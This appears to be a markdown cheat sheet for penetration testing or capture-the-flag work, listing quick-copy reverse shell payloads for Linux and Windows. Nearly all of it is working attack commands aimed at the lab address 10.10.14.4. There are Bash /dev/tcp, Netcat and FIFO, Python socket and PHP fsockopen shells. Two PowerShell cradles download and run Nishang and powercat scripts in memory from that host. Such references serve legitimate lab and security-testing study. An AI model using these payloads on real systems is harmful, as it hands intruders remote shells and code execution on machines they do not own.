---
title: "Reverse Shell Cheat Sheet"
description: "A quick reference of common reverse shell payloads for Linux and Windows systems (Bash, Netcat, Python, PHP, PowerShell)."
category: "Exploitation"
---

Quick-copy commands for establishing reverse shell connections back to your attacking machine. Make sure to replace `10.10.14.4` with your IP and `4444` with your listener port.

---

## Bash TCP

Standard bash reverse shell. Works on most Linux hosts.

```bash
bash -i >& /dev/tcp/10.10.14.4/4444 0>&1
```

---

## Netcat (nc)

If netcat is compiled with the `-e` option (danger zone):

```bash
nc -e /bin/sh 10.10.14.4 4444
```

On newer Linux installations, `-e` is often disabled. Use the **Netcat OpenBSD (FIFO)** shell instead:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4444 >/tmp/f
```

---

## Python

Python 3 one-liner:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/sh")'
```

---

## PHP

Useful for web-based command execution or uploaded web shells:

```php
php -r '$sock=fsockopen("10.10.14.4",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## PowerShell

For target Windows machines, you can use a base64-encoded payload or download a script (like `Invoke-PowerShellTcp.ps1` from Nishang) to execute:

```powershell
# Web Delivery Cradle (Downloads and executes Nishang shell in memory)
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.4:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 4444"
```

Alternatively, you can use `powercat` (PowerShell version of netcat):

```powershell
# Download and execute powercat reverse shell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.4:8000/powercat.ps1'); powercat -c 10.10.14.4 -p 4444 -e powershell"
```
